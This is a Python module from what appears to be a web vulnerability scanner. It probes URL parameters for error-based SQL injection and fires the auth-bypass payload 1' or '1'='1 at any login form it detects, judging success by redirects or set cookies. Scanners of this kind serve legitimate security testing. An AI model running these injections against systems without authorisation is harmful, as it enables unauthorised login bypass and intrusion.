"""
BENSEC - Web Application Security Scanner & WAF
SQL Injection Engine Scanner Module.
"""

import logging
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from database.models import add_vulnerability

logger = logging.getLogger(__name__)

class SQLiScanner:
    def __init__(self):
        # Traditional SQLi error string matches
        self.db_errors = [
            "you have an error in your sql syntax",
            "unclosed quotation mark after the character string",
            "oracle error",
            "mysql_fetch_array",
            "pg_query",
            "sqlite3::prepare"
        ]
        
        # Form field identification heuristics for authentication portals
        self.user_fields = ["user", "username", "email", "login", "uid", "usr"]
        self.pass_fields = ["pass", "password", "pwd", "passwd"]

    def scan(self, pages, forms, on_find=None):
        """
        Main scanner hook executed by app.py background threads.
        Audits parameter paths and authentication portals dynamically.
        """
        findings = []

        # 1. Process parameter reflection loops (Standard GET string vulnerabilities)
        for page in pages:
            if "?" in page:
                base_url, query_string = page.split("?", 1)
                params = query_string.split("&")
                
                for param in params:
                    if "=" in param:
                        key, val = param.split("=", 1)
                        # Inject error-inducing tick marks
                        test_url = f"{base_url}?{key}='"
                        
                        try:
                            res = requests.get(test_url, timeout=10, verify=False)
                            if any(error in res.text.lower() for error in self.db_errors):
                                finding = {
                                    "vuln_type": "SQL Injection (GET Error-Based)",
                                    "severity": "High",
                                    "affected_url": page,
                                    "parameter": key,
                                    "payload": "'",
                                    "description": f"Error-based SQL injection vulnerability detected on parameter '{key}'. The application returned a raw database exception structure."
                                }
                                findings.append(finding)
                                if on_find:
                                    on_find()
                        except requests.RequestException:
                            pass

        # 2. Process Authentication Form Bypass Testing Module (1' or '1'='1)
        for form in forms:
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            inputs = form.get("inputs", [])

            # Compile absolute submit route strings
            submit_url = urljoin(form.get("base_url", ""), action) if action else form.get("base_url", "")

            payload_data = {}
            is_auth_portal = False

            for field in inputs:
                name = field.get("name")
                field_type = field.get("type", "text").lower()
                
                if not name:
                    continue

                # Flag if form maps to an authorization panel framework layout
                is_user = any(uid in name.lower() for uid in self.user_fields)
                is_pass = any(pid in name.lower() for pid in self.pass_fields) or field_type == "password"

                if is_user or is_pass:
                    is_auth_portal = True
                    payload_data[name] = "1' or '1'='1"
                else:
                    payload_data[name] = field.get("value", "")

            # Submit the form if it matches authentication structures
            if is_auth_portal:
                try:
                    logger.info(f"[SQLi AUTH BYPASS] Injecting 1' or '1'='1 payload into portal: {submit_url}")
                    
                    if method == "post":
                        res = requests.post(submit_url, data=payload_data, timeout=10, verify=False, allow_redirects=False)
                    else:
                        res = requests.get(submit_url, params=payload_data, timeout=10, verify=False, allow_redirects=False)

                    # Verification Heuristics: Check for an HTTP Redirect (301/302/303) or Session Allocation
                    is_redirect = res.status_code in [301, 302, 303]
                    
                    # FIXED: Direct membership evaluation on the case-insensitive dictionary object
                    has_session = "set-cookie" in res.headers

                    if is_redirect or has_session:
                        redirect_location = res.headers.get("Location", "").lower()
                        
                        # Guard against standard failed redirects bouncing right back to login page
                        if "login" not in redirect_location or res.status_code == 200:
                            finding = {
                                "vuln_type": "SQL Injection (Auth Bypass)",
                                "severity": "High",
                                "affected_url": submit_url,
                                "parameter": ", ".join([k for k in payload_data if payload_data[k] == "1' or '1'='1"]),
                                "payload": "1' or '1'='1",
                                "description": f"Authentication bypass verified via structured payload injection on endpoint {submit_url}. The application processed the payload statement and initialized an authentic context block."
                            }
                            findings.append(finding)
                            logger.warning(f"[VULNERABILITY IDENTIFIED] Authentication bypass validated successfully at {submit_url}")
                            if on_find:
                                on_find()
                                
                except requests.RequestException as e:
                    logger.error(f"[SQLi SCAN RUNTIME ERROR] Connection drop encountered checking {submit_url}: {e}")

        return findings